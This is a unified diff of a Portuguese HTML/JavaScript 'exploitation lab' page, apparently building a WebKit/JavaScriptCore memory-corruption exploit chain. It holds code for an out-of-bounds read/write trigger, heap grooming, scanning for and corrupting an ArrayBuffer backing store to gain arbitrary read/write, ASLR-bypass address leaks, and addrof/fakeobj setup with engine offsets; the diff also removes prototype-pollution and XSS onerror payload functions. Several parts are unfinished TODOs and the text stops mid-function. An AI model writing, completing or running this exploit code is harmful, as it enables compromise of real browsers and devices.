@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Laboratório de Exploração Avançada (v2.5 - Foco Intenso Passo 1 Simplificado)</title>
+    <title>Laboratório de Exploração Avançada (v2.5.1 - Foco Corrupção Inicial AB)</title>
     <style>
         body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; font-size: 14px; }
         .container { margin-bottom: 30px; padding: 15px; background-color: #252526; border: 1px solid #333; border-radius: 5px; }
@@ -22,10 +22,11 @@
     </style>
 </head>
 <body>
-    <h1>Laboratório de Exploração Avançada (v2.5 - Foco Intenso Passo 1 Simplificado)</h1>
+    <h1>Laboratório de Exploração Avançada (v2.5.1 - Foco Corrupção Inicial AB)</h1>
     <div id="logOutput"></div>
 
     <script>
+        // ... (Mesmo código da v2.5 para AdvancedInt64, readWriteUtils, generalUtils, log, PAUSE_LAB, toHexS1, etc.)
         const KB = 1024; const MB = KB * KB; const GB = KB * KB * KB;
         class AdvancedInt64 { constructor(low, high) { let buffer = new Uint32Array(2); let bytes = new Uint8Array(buffer.buffer); if (arguments.length > 2) { throw TypeError('AdvancedInt64 takes at most 2 args'); } if (arguments.length === 0) { throw TypeError('AdvancedInt64 takes at min 1 args'); } let is_one = false; if (arguments.length === 1) { is_one = true; } if (!is_one) { if (typeof (low) !== 'number' && typeof (high) !== 'number') { throw TypeError('low/high must be numbers'); } } const check_range = (x) => (-0x80000000 <= x) && (x <= 0xffffffff); if (typeof low === 'number') { if (!check_range(low)) { throw TypeError('low not a valid value: ' + low); } if (is_one) { high = 0; if (low < 0) { high = -1; } } else { if (!check_range(high)) { throw TypeError('high not a valid value: ' + high); } } buffer[0] = low; buffer[1] = high; } else if (typeof low === 'string') { let hexstr = low; if (hexstr.substring(0, 2) === "0x") { hexstr = hexstr.substring(2); } if (hexstr.length % 2 === 1) { hexstr = '0' + hexstr; } if (hexstr.length > 16) { hexstr = hexstr.substring(hexstr.length - 16); } else { hexstr = hexstr.padStart(16, '0');} for (let i = 0; i < 8; i++) { bytes[i] = parseInt(hexstr.slice(14 - i*2, 16 - i*2), 16); } } else if (typeof low === 'object') { if (low instanceof AdvancedInt64) { bytes.set(low.bytes); } else if (low.length === 8) { bytes.set(low); } else { throw TypeError("Array must have exactly 8 elements."); } } else { throw TypeError('AdvancedInt64 does not support your object for conversion'); } this.buffer = buffer; this.bytes = bytes; } low() { return this.buffer[0]; } high() { return this.buffer[1]; } toString(is_pretty) { let lowStr = this.low().toString(16).padStart(8, '0'); let highStr = this.high().toString(16).padStart(8, '0'); if (is_pretty) { highStr = highStr.substring(0, 4) + '_' + highStr.substring(4); lowStr = lowStr.substring(0, 4) + '_' + lowStr.substring(4); return '0x' + highStr + '_' + lowStr; } return '0x' + highStr + lowStr; } add(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } let newLow = (this.low() + other.low()) >>> 0; let carry = (this.low() & 0xFFFFFFFF) + (other.low() & 0xFFFFFFFF) > 0xFFFFFFFF ? 1 : 0; let newHigh = (this.high() + other.high() + carry) >>> 0; return new AdvancedInt64(newLow, newHigh); } sub(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } const negOther = other.neg(); return this.add(negOther); } neg() { const low = ~this.low(); const high = ~this.high(); const one = new AdvancedInt64(1,0); const res = new AdvancedInt64(low, high); return res.add(one); } eq(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } return this.low() === other.low() && this.high() === other.high(); } static Zero = new AdvancedInt64(0,0); static One = new AdvancedInt64(1,0); }
         const readWriteUtils = { readBytes: (u8_view, offset, size) => { let res = 0; for (let i = 0; i < size; i++) { res += u8_view[offset + i] << (i * 8); } return res >>> 0; }, read16: (u8_view, offset) => readWriteUtils.readBytes(u8_view, offset, 2), read32: (u8_view, offset) => readWriteUtils.readBytes(u8_view, offset, 4), read64: (u8_view, offset) => { let resBytes = []; for (let i = 0; i < 8; i++) { resBytes.push(u8_view[offset + i]); } return new AdvancedInt64(resBytes); }, writeBytes: (u8_view, offset, value, size) => { for (let i = 0; i < size; i++) { u8_view[offset + i] = (value >>> (i * 8)) & 0xff; } }, write16: (u8_view, offset, value) => readWriteUtils.writeBytes(u8_view, offset, value, 2), write32: (u8_view, offset, value) => readWriteUtils.writeBytes(u8_view, offset, value, 4), write64: (u8_view, offset, value) => { if (!(value instanceof AdvancedInt64)) { throw TypeError('write64 value must be an AdvancedInt64'); } let low = value.low(); let high = value.high(); for (let i = 0; i < 4; i++) { u8_view[offset + i] = (low >>> (i * 8)) & 0xff; } for (let i = 0; i < 4; i++) { u8_view[offset + 4 + i] = (high >>> (i * 8)) & 0xff; } } };
@@ -39,16 +40,12 @@
     </script>
     <div class="container">
         <h2>Passo 0: Ativadores de Vulnerabilidades Base (Reais)</h2>
-        <p class="notes">Estas funções ativam as primitivas OOB, PP e XSS baseadas na sua análise e logs anteriores. Certifique-se que `triggerOOB_real()` está fornecendo um `oob_dataview_real` funcional e, idealmente, um `oob_leaked_ptr_real`.</p>
+        <p class="notes">Certifique-se que `triggerOOB_real()` está fornecendo um `oob_dataview_real` funcional e, idealmente, um `oob_leaked_ptr_real` (mesmo que o ponteiro não seja útil diretamente, a capacidade de leitura OOB é).</p>
         <button onclick="triggerOOB_real()">Ativar Primitiva OOB R/W (Real)</button>
-        <button onclick="triggerPP_real()">Ativar Poluição de Protótipo (Real)</button>
-        <button onclick="triggerXSS_real()">Ativar XSS Básico (Real)</button>
-        <div id="xss-target-step0" style="border:1px dotted #ccc; padding:5px; margin-top:5px; min-height:30px;">Área para XSS Básico</div>
         <script>
             let oob_array_buffer_real = null; let oob_dataview_real = null; let oob_leaked_ptr_real = null; 
             async function triggerOOB_real() { /* ... (Mesmo código da v2.4) ... */ const FNAME = 'triggerOOB_real (from testOOBReadInfoLeakEnhancedStoreS1)'; log(`--- Iniciando ${FNAME} ---`, 'test', FNAME); const bufferSize = 32; const writeValue = 0xEE; const oobWriteOffset = bufferSize; const readRangeStart = -64; const readRangeEnd = bufferSize + 64; const allocationSize = bufferSize + 256; const baseOffsetInBuffer = 128; const oobReadOffsets = []; for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); } let writeSuccess = false; let potentialLeakFoundCount = 0; oob_leaked_ptr_real = null; oob_dataview_real = null; oob_array_buffer_real = null; try { const buffer = new ArrayBuffer(allocationSize); oob_array_buffer_real = buffer; const dataView = new DataView(buffer); oob_dataview_real = dataView; for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset; await PAUSE_LAB(SHORT_PAUSE_S1_LAB); try { dataView.setUint8(writeTargetAddress, writeValue); log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHexS1(writeValue, 8)}`, 'vuln', FNAME); log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME); writeSuccess = true; } catch (e) { log(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME); log(`--- ${FNAME} Concluído (Escrita OOB Falhou) ---`, 'test', FNAME); return false; } await PAUSE_LAB(SHORT_PAUSE_S1_LAB); for (const readOffset of oobReadOffsets) { const readTargetAddress = baseOffsetInBuffer + readOffset; const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`; if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) { try { const low = dataView.getUint32(readTargetAddress, true); const high = dataView.getUint32(readTargetAddress + 4, true); if (isPotentialPointer64S1(high, low)) { const vStr = `H=${toHexS1(high)} L=${toHexS1(low)}`; log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME); potentialLeakFoundCount++; if (oob_leaked_ptr_real === null) { oob_leaked_ptr_real = { value: new AdvancedInt64(low, high), type: 'U64', offset_in_oob_buffer: readTargetAddress, original_dataview: dataView }; log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME); } } } catch (e) {} } if (oob_leaked_ptr_real === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) { try { const val32 = dataView.getUint32(readTargetAddress, true); if (isPotentialData32S1(val32)) { log(` -> Leak U32? ${relOffsetStr}: ${toHexS1(val32)}`, 'leak', FNAME); potentialLeakFoundCount++; oob_leaked_ptr_real = { value: new AdvancedInt64(val32, 0), type: 'U32', offset_in_oob_buffer: readTargetAddress, original_dataview: dataView }; log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Potencial Vazamento Info OOB Read U32 ***`, 'escalation', FNAME); } if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) { log(` -> Leu valor OOB escrito (${toHexS1(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME); } } catch (e) {} } if (readOffset % 32 === 0) await PAUSE_LAB(1); } } catch (e) { log(`Erro fatal em ${FNAME}: ${e.message}`, 'error', FNAME); console.error(e); } finally { const leakStatus = oob_leaked_ptr_real ? `1 valor ${oob_leaked_ptr_real.type} @${oob_leaked_ptr_real.offset_in_oob_buffer}` : 'nenhum valor armazenado'; log(`--- ${FNAME} Concluído (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME); if (oob_dataview_real) { log("`oob_dataview_real` e `oob_leaked_ptr_real` (se houver vazamento) estão prontos para uso.", "good", FNAME); } } return writeSuccess; }
-            async function triggerPP_real() { /* ... (Mesmo código da v2.4) ... */ const FNAME = 'triggerPP_real (from testBasicPPS1)'; log(`--- Iniciando ${FNAME} ---`, 'test', FNAME); const prop = '__lab_pp_real__'; const val = 'Polluted_Lab_Value_Real!'; let ok = false; try { Object.prototype[prop] = val; await PAUSE_LAB(SHORT_PAUSE_S1_LAB); let testObj = {}; const inheritedValue = testObj[prop]; if (inheritedValue === val) { log(`VULN: PP Básica REAL OK! Objeto herdou a propriedade poluída '${prop}'.`, 'vuln', FNAME); ok = true; } else { log(`PP Básica REAL falhou ou não detectada para '${prop}'.`, 'good', FNAME); } } catch (e) { log(`Erro durante ${FNAME}: ${e.message}`, 'error', FNAME); console.error(e); } finally { try { delete Object.prototype[prop]; } catch(e){ log(`Erro ao limpar Object.prototype.${prop}: ${e.message}`, 'error', FNAME); } } log(`--- ${FNAME} Concluído (PP Básica ${ok ? 'OK' : 'Falhou'}) ---`, 'test', FNAME); return ok; }
-            async function triggerXSS_real() { /* ... (Mesmo código da v2.4) ... */ const FNAME = 'triggerXSS_real (from testCSPBypassS1)'; log(`--- Iniciando ${FNAME} ---`, 'test', FNAME); const targetDiv = document.getElementById('xss-target-step0'); targetDiv.innerHTML = ''; try { const imgTag = document.createElement('img'); const imgSrc = 'invalid_img_' + Date.now(); imgTag.src = imgSrc; const onerrorPayload = ` this.onerror=null; this.src=''; try { log("XSS REAL via ONERROR Executado!", "vuln", "XSS Payload (Real)"); const targetLog = document.getElementById('xss-target-step0'); if(targetLog) { const logMsg = document.createElement('span'); logMsg.className = 'log-vuln'; logMsg.innerHTML = "<br>XSS REAL ONERROR OK!"; targetLog.appendChild(logMsg); } } catch(e) { log("Erro payload onerror: " + e.message, "warn", "XSS Payload (Real)"); }`; imgTag.setAttribute('onerror', onerrorPayload); targetDiv.appendChild(imgTag); await PAUSE_LAB(SHORT_PAUSE_S1_LAB * 2); } catch (e) { log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error', FNAME); } log(`--- ${FNAME} Concluído ---`, 'test', FNAME); }
+            // triggerPP_real e triggerXSS_real removidos para simplificação
         </script>
     </div>
 
@@ -56,55 +53,53 @@
         <h2>Passo 1: Primitivas Fundamentais: R/W Arbitrário, Vazamento de Endereços, `addrof`/`fakeobj`</h2>
         <p class="notes">Este é o coração do exploit. Transformaremos sua OOB Write inicial em controle total da memória.</p>
         
-        <h4>1.A: Desenvolver Leitura/Escrita Arbitrária (Corrupção de `ArrayBuffer`)</h4>
-        <p class="notes"><b>Estratégia Central:</b> Usar `oob_dataview_real` (sua primitiva OOB inicial) para encontrar e sobrescrever os metadados (`m_vector` e `m_byteLength`) de um `ArrayBuffer` vítima (`victim_view_for_arb_rw.buffer`).</p>
+        <h4>1.A: Desenvolver Leitura/Escrita Arbitrária (Corrupção *Inicial* de `ArrayBuffer`)</h4>
+        <p class="notes"><b>Estratégia Revisada:</b> Obter a *primeira* primitiva de R/W arbitrário corrompendo um `ArrayBuffer` (`ab_to_corrupt_initially`) que esteja adjacente ou muito próximo ao `oob_array_buffer_real`. Usaremos `oob_dataview_real` tanto para encontrar quanto para corromper este primeiro AB.</p>
         <div class="code-comment">
         <b>Offsets Críticos (Baseado na SUA ANÁLISE de Disassembly e `Offsets JSCell.txt`):</b><br>
-        - <span class="todo">`JSC_VIEW_TO_BACKING_STORE_PTR_OFFSET`</span>: Hipótese `0x20`. Offset do JSCell de um `ArrayBufferView` (como `Uint8Array`) para o *ponteiro* que aponta para o `ArrayBufferBackingStore` (ou `JSArrayBuffer`). <b class="todo">VOCÊ PRECISA CONFIRMAR ESTE OFFSET EXPERIMENTALMENTE.</b><br>
-        - <span class="todo">`OFFSET_BACKING_STORE_VECTOR_PTR`</span>: Confirmado como `0x10`. Offset DENTRO do `ArrayBufferBackingStore` para o ponteiro dos dados brutos (`m_vector`).<br>
-        - <span class="todo">`OFFSET_BACKING_STORE_BYTE_LENGTH`</span>: Confirmado como `0x20`. Offset DENTRO do `ArrayBufferBackingStore` para o tamanho (`m_byteLength`, provavelmente U32).<br>
-        - <span class="todo">`OFFSET_JSCELL_STRUCTURE_ID`</span>: Confirmado como `0x0` (do `Offsets JSCell.txt`). Útil para `addrof`.
+        - <span class="todo">`JSC_VIEW_TO_BACKING_STORE_PTR_OFFSET`</span>: Hipótese `0x20`. Do JSCell de um `ArrayBufferView` para o *ponteiro* do `ArrayBufferBackingStore`. <b class="todo">CONFIRME ESTE OFFSET!</b><br>
+        - <span class="todo">`OFFSET_BACKING_STORE_VECTOR_PTR`</span>: Confirmado como `0x10`. DENTRO do `ArrayBufferBackingStore`: ponteiro para os dados (`m_vector`).<br>
+        - <span class="todo">`OFFSET_BACKING_STORE_BYTE_LENGTH`</span>: Confirmado como `0x20`. DENTRO do `ArrayBufferBackingStore`: tamanho (`m_byteLength`).<br>
+        - <span class="todo">`OFFSET_JSCELL_STRUCTURE_ID`</span>: Confirmado como `0x0`.
         </div>
-        <p class="notes"><b>Fluxo de Trabalho Sugerido:</b>
+        <p class="notes"><b>Fluxo de Trabalho Sugerido para esta seção:</b>
             <ol>
-                <li><b>Ativar OOB (Passo 0):</b> Garanta que `oob_dataview_real` e `oob_array_buffer_real` estejam funcionais.</li>
-                <li><b>`setupHeapAndVictim()`:</b> Execute para criar `victim_view_for_arb_rw` (um `Uint8Array`).</li>
-                <li><b>Implementar `addrof_primitive` (Passo 1.C primeiro!):</b> Você *precisa* de `addrof` para encontrar o endereço do `JSCell` do `victim_view_for_arb_rw`. Sem isso, a corrupção direcionada é quase impossível.</li>
-                <li><b>`attemptArrayBufferCorruptionAndSetupArbRW()`:</b>
+                <li><b>Ativar OOB (Passo 0).</b></li>
+                <li><b>`setupVictimForInitialCorruption()`:</b> Aloca `ab_to_corrupt_initially` (um `ArrayBuffer` simples) e tenta "Heap Grooming" para posicioná-lo.</li>
+                <li><b>`findAndCorruptInitialVictim()`:</b>
                     <ul>
-                        <li>Usa `addrof` para obter `addr_jscell_victim_view`.</li>
-                        <li>Usa sua (ainda a ser desenvolvida) `arb_read_primitive` inicial (que pode ser baseada em `oob_dataview_real` se você conseguir um bom alcance OOB) para ler o ponteiro para o `BackingStore`.</li>
-                        <li>Usa sua (ainda a ser desenvolvida) `arb_write_primitive` inicial (ou `oob_dataview_real`) para sobrescrever `m_vector` e `m_byteLength` no `BackingStore`.</li>
+                        <li>Usa `oob_dataview_real` para LER a memória OOB e tentar localizar `ab_to_corrupt_initially` ou seu `ArrayBufferBackingStore`. (Procurar pelo tamanho, padrão, ou `StructureID`).</li>
+                        <li>Se encontrado, calcula os endereços dos campos `m_vector` e `m_byteLength` do seu `BackingStore` (relativos ao `oob_dataview_real`).</li>
+                        <li>Usa `oob_dataview_real` para ESCREVER e corromper esses campos.</li>
+                        <li>Se bem-sucedido, cria `arb_read_primitive` e `arb_write_primitive` globais usando um `new DataView(ab_to_corrupt_initially)`.</li>
                     </ul>
                 </li>
             </ol>
         </p>
-        <button onclick="attemptArrayBufferCorruptionAndSetupArbRW()">Tentar Corromper `ArrayBuffer` e Definir R/W Arbitrário</button> <br>
+        <button onclick="findAndCorruptInitialVictim()">1. Corromper AB Inicial e Definir R/W Arbitrário</button> <br>
         
         <h4>1.B: Vazar Endereços Base (ASLR Bypass)</h4>
-        <p class="notes">Após obter `arb_read_primitive` no Passo 1.A, use-a para escanear a memória e encontrar os endereços base dos módulos.</p>
-        <button onclick="attemptBaseAddressLeak()">Tentar Vazar Endereços Base</button>
-        <br>
+        <p class="notes">APÓS obter `arb_read_primitive` no Passo 1.A, use-a para escanear a memória.</p>
+        <button onclick="attemptBaseAddressLeak()">2. Tentar Vazar Endereços Base (Requer R/W Arbitrário)</button>
         Endereço inicial para busca de valor: <input type="text" id="searchRangeStartAddress" placeholder="0xEndereçoVazado (ou deixe em branco)">
         Tamanho da busca (bytes): <input type="text" id="searchRangeSize" value="8192" placeholder="bytes">
         Valor/Padrão a buscar (hex, ex: 7f454c46 para ELF): <input type="text" id="searchKnownValue" value="7f454c46" placeholder="Hex bytes (ex: 7f454c46 ELF)">
-        <button onclick="searchMemoryForValue()">Buscar Valor na Memória</button>
+        <button onclick="searchMemoryForValue()">Buscar Valor na Memória (Requer R/W Arbitrário)</button>
 
         <h4>1.C: Implementar Primitivas `addrof` e `fakeobj`</h4>
-        <p class="notes">`addrof(obj)`: Retorna o endereço de memória de `obj`. <br>
-           `fakeobj(addr)`: Cria um objeto JS que trata `addr` como seu buffer de dados interno.</p>
-        <button onclick="manualSetupAndAddrofTest()">1. Preparar Vítima e Testar `addrof(obj)`</button>
-        <button onclick="testFakeobj()">2. Testar `fakeobj(addr)` (após `addrof` funcionar)</button>
-        <br>
+        <p class="notes">APÓS obter `arb_read_primitive` e `arb_write_primitive` confiáveis.</p>
+        <button onclick="manualSetupAndAddrofTest()">3. Preparar Vítima (Uint8Array) e Testar `addrof(obj)`</button>
+        <button onclick="testFakeobj()">4. Testar `fakeobj(addr)`</button>
         Nome do objeto para `addrof`: <input type="text" id="addrofObjectName" value="victim_view_for_arb_rw_GLOBAL" placeholder="victim_view_for_arb_rw_GLOBAL">
         Endereço para `fakeobj`: <input type="text" id="fakeobjAddress" value="0x100000000" placeholder="0xEndereçoParaFakeObj">
 
+
         <script>
-            let arb_read_primitive = null;    // function(address: AdvancedInt64, size: number): Uint8Array | null
-            let arb_write_primitive = null;   // function(address: AdvancedInt64, data: Uint8Array | Array<number>): boolean
-            let addrof_primitive = null;      // function(obj: any): AdvancedInt64 | null
-            let fakeobj_primitive = null;     // function(address: AdvancedInt64): any | null
-            let test_obj_lab = { p1: 123, p2: "test_lab_obj_v2.5" }; 
+            let arb_read_primitive = null;    
+            let arb_write_primitive = null;   
+            let addrof_primitive = null;      
+            let fakeobj_primitive = null;     
+            let test_obj_lab = { p1: 123, p2: "test_lab_obj_v2.5.1" }; 
 
             let base_libkernel = null;      let base_libkernel_web = null; let base_webkit = null;
 
@@ -112,247 +107,200 @@
             const OFFSET_BACKING_STORE_VECTOR_PTR = new AdvancedInt64(0x10);    
             const OFFSET_BACKING_STORE_BYTE_LENGTH = new AdvancedInt64(0x20);   
             const OFFSET_JSCELL_STRUCTURE_ID = new AdvancedInt64(0x0);
-            const OFFSET_JSCELL_INDEXING_TYPE_MISC = new AdvancedInt64(0x8);
-            
-            // Placeholder: Offsets DENTRO do JSCell de um JSArray para o butterfly e length (PRECISAM SER ENCONTRADOS!)
-            const OFFSET_JSARRAY_JSCell_TO_BUTTERFLY_PTR = new AdvancedInt64(0x10); // EXEMPLO!
-            const OFFSET_JSARRAY_JSCell_TO_LENGTH_FIELD = new AdvancedInt64(0x18); // EXEMPLO! (para o campo 'length' do JSArray)
+            // const OFFSET_JSCELL_INDEXING_TYPE_MISC = new AdvancedInt64(0x8); // Do Offsets JSCell.txt
+            // const OFFSET_JSARRAY_JSCell_TO_BUTTERFLY_PTR = new AdvancedInt64(0x10); // EXEMPLO!
+            // const OFFSET_JSARRAY_JSCell_TO_LENGTH_FIELD = new AdvancedInt64(0x18); // EXEMPLO!
 
 
-            let victim_view_for_arb_rw = null; 
-            let corrupted_data_view_for_arb_rw = null;  
-            let addr_jscell_victim_view = null; 
-            let addr_backing_store_of_victim = null; 
-            window.victim_view_for_arb_rw_GLOBAL = null; // Para acesso pelo input de addrof
+            let ab_to_corrupt_initially = null; // Alvo da primeira corrupção
+            let victim_view_for_addrof_target = null; // Alvo para addrof, um Uint8Array
+            window.victim_view_for_arb_rw_GLOBAL = null; // Expor para addrof via input
 
-            async function setupHeapAndVictim() { /* ... (mesmo da v2.4, mas expõe victim_view_for_arb_rw_GLOBAL) ... */
-                const FNAME = "setupHeapAndVictim";
-                log("Configurando heap e objeto vítima...", "info", FNAME);
-                if (!oob_dataview_real) { log("OOB não ativado.", "error", FNAME); return false; }
-                let spray = []; for(let i=0; i<50; i++) spray.push(new Uint32Array(128 + i*4));
-                const victim_size = 256; 
-                let potential_victims = [];
-                for(let i=0; i<10; i++) { potential_victims.push(new Uint8Array(victim_size + i)); }
-                victim_view_for_arb_rw = potential_victims[Math.floor(potential_victims.length / 2)]; 
-                for(let i=0; i<victim_view_for_arb_rw.length; i++) victim_view_for_arb_rw[i] = (i % 2 === 0) ? 0xDD : 0xEE ;
-                window.victim_view_for_arb_rw_GLOBAL = victim_view_for_arb_rw; 
-                log(`victim_view_for_arb_rw (Uint8Array de ${victim_view_for_arb_rw.byteLength} bytes) criado e exposto como window.victim_view_for_arb_rw_GLOBAL. Padrão DDEE.`, "info", FNAME);
-                log("Próximo passo crítico: Implementar e testar `addrof_primitive` para obter o endereço do JSCell de `victim_view_for_arb_rw_GLOBAL`.", "warn", FNAME);
+            async function setupVictimForInitialCorruption() {
+                const FNAME = "setupVictimForInitialCorruption";
+                log("Configurando ArrayBuffer vítima para corrupção inicial...", "info", FNAME);
+                if (!oob_array_buffer_real) { log("Buffer OOB base (`oob_array_buffer_real`) não existe. Ative-o primeiro (Passo 0).", "error", FNAME); return false; }
+                
+                // Tentar "Heap Grooming" simples: alocar a vítima logo após o buffer OOB.
+                // A eficácia disso depende MUITO do alocador de memória do sistema.
+                let spray_buffers = [];
+                for(let i=0; i<20; i++){ // Alocar alguns buffers antes para tentar "limpar" o caminho
+                    spray_buffers.push(new ArrayBuffer(128 + i*16));
+                }
+                
+                ab_to_corrupt_initially = new ArrayBuffer(256); // Tamanho conhecido para procurar
+                let view = new Uint8Array(ab_to_corrupt_initially);
+                for(let i=0; i<view.length; i++) view[i] = 0xCC; // Preencher com padrão 0xCC
+                window.ab_to_corrupt_initially_GLOBAL = ab_to_corrupt_initially; // Expor para depuração
+
+                log(``ab_to_corrupt_initially` (ArrayBuffer de ${ab_to_corrupt_initially.byteLength} bytes) criado com padrão 0xCC.`, "info", FNAME);
+                log("Agora o desafio é ENCONTRAR este `ab_to_corrupt_initially` na memória usando `oob_dataview_real` e então CORROMPÊ-LO.", "warn", FNAME);
                 return true;
             }
             
-            // Esta função agora é o FOCO PRINCIPAL para obter R/W arbitrário.
-            // Ela depende de um addrof funcional para encontrar a vítima,
-            // e de arb_read/arb_write (que podem ser o oob_dataview_real inicialmente)
-            // para ler/escrever os ponteiros/campos.
-            async function attemptArrayBufferCorruptionAndSetupArbRW() {
-                const FNAME = "ArrayBufferCorruptionAndSetupArbRW";
-                log("--- Tentando Corromper `ArrayBuffer` da Vítima e Definir R/W Arbitrário ---", "test", FNAME);
+            async function findAndCorruptInitialVictim() {
+                const FNAME = "findAndCorruptInitialVictim";
+                log(`--- ${FNAME}: Tentando encontrar e corromper o AB Vítima Inicial ---`, "test", FNAME);
+                if (!oob_dataview_real || !oob_array_buffer_real) { log("OOB não ativado (Passo 0).", "error", FNAME); return; }
+                if (!ab_to_corrupt_initially) { 
+                    if (!await setupVictimForInitialCorruption()) return;
+                }
+
+                log("Fase 1: Encontrar o `ArrayBufferBackingStore` do `ab_to_corrupt_initially` usando `oob_dataview_real`.", "info", FNAME);
+                log("<span class='todo'>VOCÊ PRECISA IMPLEMENTAR A LÓGICA DE VARREDURA ABAIXO:</span>", "warn", FNAME);
                 
-                if (!victim_view_for_arb_rw) { 
-                    log("Objeto vítima `victim_view_for_arb_rw` não configurado. Execute 'Preparar Vítima' no Passo 1.C primeiro.", "error", FNAME);
+                let found_backing_store_offset_in_oob_dv = -1;
+                const victim_expected_size = ab_to_corrupt_initially.byteLength; // 256
+                const oob_scan_range = oob_dataview_real.buffer.byteLength - oob_array_buffer_real.byteLength; // Tamanho da área OOB que podemos ler/escrever
+                const oob_scan_start_offset = oob_array_buffer_real.byteLength; // Começa a escanear logo após o buffer OOB original
+
+                // Estratégia de busca:
+                // 1. O `ab_to_corrupt_initially` foi preenchido com 0xCC.
+                // 2. Seu `ArrayBufferBackingStore` terá um campo `m_byteLength` (offset +0x20) igual a `victim_expected_size`.
+                // 3. E um ponteiro `m_vector` (offset +0x10) que aponta para os dados 0xCC.
+                // Vamos procurar pelo `m_byteLength` (tamanho) primeiro.
+                
+                // O `oob_dataview_real` é um DataView sobre o `oob_array_buffer_real` que tem `allocationSize` (ex: 32+256).
+                // A escrita OOB do `triggerOOB_real` ocorre em `baseOffsetInBuffer + oobWriteOffset` (ex: 128+32 = 160).
+                // O `oob_dataview_real` pode ler/escrever em toda sua extensão (`allocationSize`).
+                // A varredura deve ser feita dentro dos limites do `oob_dataview_real`.
+
+                log(`Iniciando varredura OOB com \`oob_dataview_real\` (tamanho: ${oob_dataview_real.buffer.byteLength} bytes) para encontrar BackingStore da vítima (tamanho esperado: ${victim_expected_size})...`, "info", FNAME);
+                for (let i = 0; i < oob_dataview_real.buffer.byteLength - 8; i += 4) { // Alinhamento de 4 ou 8 bytes
+                    try {
+                        // Tentamos ler um ponteiro para o m_vector e o byteLength
+                        // Assumindo que i é o início do BackingStore
+                        let potential_vector_low = oob_dataview_real.getUint32(i + OFFSET_BACKING_STORE_VECTOR_PTR.low(), true);
+                        let potential_vector_high = oob_dataview_real.getUint32(i + OFFSET_BACKING_STORE_VECTOR_PTR.low() + 4, true);
+                        let potential_length = oob_dataview_real.getUint32(i + OFFSET_BACKING_STORE_BYTE_LENGTH.low(), true);
+
+                        if (potential_length === victim_expected_size) {
+                            // Encontramos um candidato! Agora verificar se o m_vector aponta para os dados 0xCC
+                            let vector_addr = new AdvancedInt64(potential_vector_low, potential_vector_high);
+                            // Para verificar o m_vector, precisaríamos de uma forma de ler `vector_addr`
+                            // Se o `vector_addr` estiver DENTRO do alcance do `oob_dataview_real`, podemos tentar.
+                            // Senão, esta verificação é mais difícil agora.
+                            log(`CANDIDATO BackingStore encontrado em offset ${i} no \`oob_dataview_real\`. Tamanho corresponde (${potential_length}). m_vector aponta para ${vector_addr.toString(true)}`, "leak", FNAME);
+                            // <span class="todo">TODO: Adicionar verificação do conteúdo do m_vector se possível.</span>
+                            found_backing_store_offset_in_oob_dv = i;
+                            break;
+                        }
+                    } catch(e) { /* Ignorar erros de leitura fora dos limites do oob_dataview_real */ }
+                     if (i % (1024*4) === 0 && i > 0) await PAUSE_LAB(10);
+                }
+
+                if (found_backing_store_offset_in_oob_dv === -1) {
+                    log("Falha ao encontrar o `ArrayBufferBackingStore` da vítima na varredura OOB.", "error", FNAME);
+                    log("Tente ajustar `setupVictimForInitialCorruption` (Heap Grooming) ou a lógica de varredura.", "error", FNAME);
                     return;
                 }
-                if (!addrof_primitive) { log("`addrof_primitive` é necessária. Implemente e teste-a primeiro (Passo 1.C).", "error", FNAME); return; }
-                
-                // Se arb_read/write ainda não foram estabelecidas, precisamos de uma forma de ler/escrever para executar a corrupção.
-                // Se o oob_dataview_real tiver alcance suficiente para atingir os metadados da vítima (após addrof), podemos usá-lo.
-                // Esta é uma situação de "ovo e galinha". Idealmente, o OOB inicial é forte o suficiente.
-                let current_read = arb_read_primitive;
-                let current_write = arb_write_primitive;
+                log(``ArrayBufferBackingStore` da vítima encontrado no offset ${found_backing_store_offset_in_oob_dv} do \`oob_dataview_real\`.`, "vuln", FNAME);
 
-                if (!current_read || !current_write) {
-                    log("`arb_read_primitive` ou `arb_write_primitive` globais não estão prontas.", "warn", FNAME);
-                    if (oob_dataview_real) {
-                        log("Tentando usar `oob_dataview_real` para a corrupção inicial. Isso requer que `oob_dataview_real` possa alcançar os alvos.", "info", FNAME);
-                        // Definir funções de leitura/escrita temporárias baseadas no oob_dataview_real
-                        // Estas são limitadas ao alcance e capacidade do oob_dataview_real
-                        const oob_read_temp = (address64, size) => {
-                            // TODO (VOCÊ PRECISA IMPLEMENTAR):
-                            // Calcule o offset DENTRO do oob_dataview_real que corresponde ao address64.
-                            // Isso requer saber o endereço base que o oob_dataview_real cobre.
-                            // Se oob_leaked_ptr_real.offset_in_oob_buffer é onde o leak ocorreu, e oob_leaked_ptr_real.value
-                            // é o valor nesse local, você pode tentar extrapolar.
-                            // Esta é uma parte complexa e depende de como o oob_dataview_real foi criado.
